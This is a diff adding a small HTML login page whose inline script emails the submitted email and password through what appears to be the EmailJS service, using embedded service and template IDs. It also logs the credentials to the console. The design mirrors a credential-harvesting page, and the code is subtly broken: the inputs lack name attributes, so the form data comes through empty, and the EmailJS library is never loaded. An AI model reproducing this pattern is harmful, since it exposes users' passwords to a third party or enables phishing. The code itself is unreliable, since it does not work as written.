@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="stylelogin.css">
+        <title>Login</title>
+    </head>
+    <body>
+        
+        <form id="login">
+            <div><b>
+            <label for="email">Email:</label>
+            <input type="email" id="email" placeholder="user@example.com" required autocomplete="email">
+            </div>
+            <br>
+            <div>
+            <label for="pass">Password:</label>
+            <input type="password" id="pass" maxlength="12" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <br>
+            <div>
+            <input type="reset" class="buttons">
+            <input type="submit" class="buttons">
+            </div></b>
+         </form>
+         <script>
+emailjs.init("myNiClXX-7199L1HM");
+
+document.getElementById("login").addEventListener("submit", function (event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    // Collect form data
+    const formData = new FormData(event.target);
+    const formObject = Object.fromEntries(formData.entries());
+
+    console.log("Form data:", formObject); // Debugging step
+
+    // Send the form data to EmailJS
+    emailjs
+        .send("service_mq87pez", "template_4vd6qk5", formObject)
+        .then((response) => {
+            console.log("Email sent successfully!", response.status, response.text);
+            alert("Login details sent! Redirecting to the home page...");
+            window.location.href = "home.html"; // Redirect after success
+        })
+        .catch((error) => {
+            console.error("Failed to send email", error);
+            alert("Failed to send login details. Please try again.");
+        });
+});
+        </script>  
+    </body>
+</html>
